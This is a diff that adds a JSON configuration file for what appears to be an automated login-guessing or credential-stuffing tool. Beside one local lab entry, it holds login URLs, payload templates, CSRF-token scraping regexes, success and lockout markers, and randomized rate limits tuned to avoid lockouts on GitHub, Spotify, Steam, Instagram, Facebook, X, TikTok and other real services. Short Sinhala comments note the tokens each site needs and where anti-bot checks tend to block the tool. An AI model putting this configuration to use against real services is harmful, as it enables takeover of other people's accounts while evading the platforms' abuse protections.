@@ -1,0 +1,222 @@
+{
+  "lab": {
+    "name": "Local Lab",
+    "login": {
+      "url": "http://127.0.0.1:5000/login",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}"},
+      "requires_token": false,
+      "failure_markers": ["invalid credentials"],
+      "success_markers": ["welcome"],
+      "lockout_markers": ["account locked", "too many", "try again later"],
+      "rate": {"max_per_minute": 30, "delay_min": 0.5, "delay_max": 1.5, "lockout_after": 8, "on_lockout": "wait", "cooldown_seconds": 60}
+    }
+  },
+  "github": {
+    "name": "GitHub",
+    "login": {
+      "url": "https://github.com/session",
+      "method": "POST",
+      "payload": {"login": "{ID}", "password": "{PASS}", "authenticity_token": "{TOKEN}", "commit": "Sign in"},
+      "requires_token": true,
+      "token_source": {"url": "https://github.com/login", "regex": "name=\"authenticity_token\" value=\"([^\"]+)\""},
+      "failure_markers": ["incorrect username or password", "did not match"],
+      "success_redirects": ["/"],
+      "lockout_markers": ["rate limit", "many attempts", "captcha", "login attempts"],
+      "rate": {"max_per_minute": 8, "delay_min": 2, "delay_max": 5, "lockout_after": 12, "on_lockout": "wait", "cooldown_seconds": 300}
+    }
+  },
+  "gitlab": {
+    "name": "GitLab",
+    "login": {
+      "url": "https://gitlab.com/users/sign_in",
+      "method": "POST",
+      "payload": {"user[login]": "{ID}", "user[password]": "{PASS}", "authenticity_token": "{TOKEN}"},
+      "requires_token": true,
+      "token_source": {"url": "https://gitlab.com/users/sign_in", "regex": "name=\"authenticity_token\" value=\"([^\"]+)\""},
+      "failure_markers": ["invalid login or password", "invalid credentials"],
+      "success_redirects": ["/"],
+      "lockout_markers": ["many failed login attempts", "rate limit", "blocked"],
+      "rate": {"max_per_minute": 8, "delay_min": 2, "delay_max": 5, "lockout_after": 10, "on_lockout": "wait", "cooldown_seconds": 300}
+    }
+  },
+  "spotify": {
+    "name": "Spotify",
+    "login": {
+      "url": "https://accounts.spotify.com/api/login",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}", "csrf_token": "{TOKEN}"},
+      "requires_token": true,
+      "token_source": {"url": "https://accounts.spotify.com/en/login", "regex": "csrf_token\" value=\"([^\"]+)\""},
+      "failure_markers": ["incorrect username or password", "wrong password"],
+      "success_markers": ["auth_token"],
+      "lockout_markers": ["captcha", "too many", "rate limit"],
+      "rate": {"max_per_minute": 4, "delay_min": 4, "delay_max": 8, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "reddit": {
+    "name": "Reddit",
+    "login": {
+      "url": "https://www.reddit.com/api/login",
+      "method": "POST",
+      "payload": {"user": "{ID}", "passwd": "{PASS}", "api_type": "json", "rem": "true"},
+      "requires_token": false,
+      "failure_markers": ["wrong password", "invalid login"],
+      "success_markers": ["\"success\": true"],
+      "lockout_markers": ["too many requests", "rate", "captcha"],
+      "rate": {"max_per_minute": 5, "delay_min": 3, "delay_max": 6, "lockout_after": 4, "on_lockout": "abort", "cooldown_seconds": 600}
+    }
+  },
+  "twitch": {
+    "name": "Twitch",
+    "login": {
+      "url": "https://passport.twitch.tv/protected/login",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}", "client_id": "kd1unb4b3q4tbnfckf0f4d8f", "client_version": "1.0", "undelete_user": "false", "remember_me": "true"},
+      "requires_token": false,
+      "failure_markers": ["incorrect username or password", "invalid password"],
+      "success_markers": ["access_token"],
+      "lockout_markers": ["too many", "captcha", "rate"],
+      "rate": {"max_per_minute": 5, "delay_min": 3, "delay_max": 7, "lockout_after": 4, "on_lockout": "abort", "cooldown_seconds": 600}
+    }
+  },
+  "epicgames": {
+    "name": "Epic Games",
+    "login": {
+      "url": "https://www.epicgames.com/id/api/login",
+      "method": "POST",
+      "payload": {"email": "{ID}", "password": "{PASS}"},
+      "requires_token": false,
+      "failure_markers": ["errors", "invalid"],
+      "success_markers": ["sid"],
+      "lockout_markers": ["too many", "captcha", "rate"],
+      "rate": {"max_per_minute": 4, "delay_min": 4, "delay_max": 8, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "medium": {
+    "name": "Medium",
+    "login": {
+      "url": "https://medium.com/_/api/users/login",
+      "method": "POST",
+      "payload": {"email": "{ID}", "password": "{PASS}"},
+      "requires_token": true,
+      "token_note": "Medium tokens ඕන (tokens/medium.json)",
+      "failure_markers": ["invalid", "incorrect"],
+      "success_markers": ["user"],
+      "lockout_markers": ["too many", "rate", "captcha"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 600}
+    }
+  },
+  "tumblr": {
+    "name": "Tumblr",
+    "login": {
+      "url": "https://www.tumblr.com/svc/account/login",
+      "method": "POST",
+      "payload": {"email": "{ID}", "password": "{PASS}"},
+      "requires_token": true,
+      "token_note": "tokens/tumblr.json ඕන",
+      "failure_markers": ["incorrect", "invalid"],
+      "success_markers": ["redirect_url"],
+      "lockout_markers": ["too many", "rate limit", "captcha"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 600}
+    }
+  },
+  "steam": {
+    "name": "Steam",
+    "login": {
+      "url": "https://steamcommunity.com/login/dologin/",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}", "captchagid": "-1", "rsatimestamp": "{RSATIME}", "twofactorcode": ""},
+      "requires_token": true,
+      "token_note": "Steam RSA flow එක tokens/steam.json වලින්",
+      "failure_markers": ["incorrect password", "invalid password"],
+      "success_redirects": ["/"],
+      "lockout_markers": ["too many", "captcha", "rate"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "linkedin": {
+    "name": "LinkedIn",
+    "login": {
+      "url": "https://www.linkedin.com/uas/login-submit",
+      "method": "POST",
+      "payload": {"session_key": "{ID}", "session_password": "{PASS}", "csrfToken": "{TOKEN}", "loginCsrfParam": "{TOKEN}"},
+      "requires_token": true,
+      "token_note": "LinkedIn csrfToken ඕන (anti-bot නිසා බොහෝ විට block)",
+      "failure_markers": ["incorrect", "invalid password"],
+      "success_redirects": ["/feed", "/checkpoint"],
+      "lockout_markers": ["too many attempts", "captcha", "rate limit"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 600}
+    }
+  },
+  "instagram": {
+    "name": "Instagram",
+    "login": {
+      "url": "https://www.instagram.com/accounts/login/ajax/",
+      "method": "POST",
+      "payload": {"username": "{ID}", "enc_password": "#PWD#1:{PASS}", "queryParams": "{}", "optIntoOneTap": "false"},
+      "requires_token": true,
+      "token_note": "csrftoken + sessionid ඕන (tokens/instagram.json)",
+      "failure_markers": ["incorrect", "bad_password"],
+      "success_markers": ["authenticated"],
+      "lockout_markers": ["challenge_required", "checkpoint_required", "rate limit"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "facebook": {
+    "name": "Facebook",
+    "login": {
+      "url": "https://www.facebook.com/login/device-based/regular/login/",
+      "method": "POST",
+      "payload": {"email": "{ID}", "pass": "{PASS}"},
+      "requires_token": true,
+      "token_note": "fb_dtsg token + cookies ඕන (tokens/facebook.json)",
+      "failure_markers": ["incorrect password", "the password you entered is incorrect"],
+      "success_redirects": ["/"],
+      "lockout_markers": ["temporarily blocked", "too many", "security check", "captcha"],
+      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "x": {
+    "name": "X / Twitter",
+    "login": {
+      "url": "https://x.com/sessions",
+      "method": "POST",
+      "payload": {"session[username_or_email]": "{ID}", "session[password]": "{PASS}"},
+      "requires_token": true,
+      "token_note": "X authenticator flow token ඕන (tokens/x.json) - anti-bot block වෙනවා",
+      "failure_markers": ["incorrect password", "did not match"],
+      "success_redirects": ["/home"],
+      "lockout_markers": ["rate limit", "too many attempts", "captcha"],
+      "rate": {"max_per_minute": 2, "delay_min": 8, "delay_max": 15, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "tiktok": {
+    "name": "TikTok",
+    "login": {
+      "url": "https://www.tiktok.com/api/v1/auth/login/",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}"},
+      "requires_token": true,
+      "token_note": "TikTok captcha verify ඕන (tokens/tiktok.json)",
+      "failure_markers": ["invalid", "incorrect", "error_code"],
+      "success_markers": ["session"],
+      "lockout_markers": ["captcha", "rate limit", "blocked", "verify"],
+      "rate": {"max_per_minute": 2, "delay_min": 8, "delay_max": 15, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  },
+  "snapchat": {
+    "name": "Snapchat",
+    "login": {
+      "url": "https://accounts.snapchat.com/accounts/login",
+      "method": "POST",
+      "payload": {"username": "{ID}", "password": "{PASS}"},
+      "requires_token": true,
+      "token_note": "xsrf token + cookies ඕන (tokens/snapchat.json)",
+      "failure_markers": ["incorrect password", "invalid"],
+      "success_redirects": ["/"],
+      "lockout_markers": ["too many", "captcha", "blocked", "rate"],
+      "rate": {"max_per_minute": 2, "delay_min": 8, "delay_max": 15, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
+    }
+  }
+}
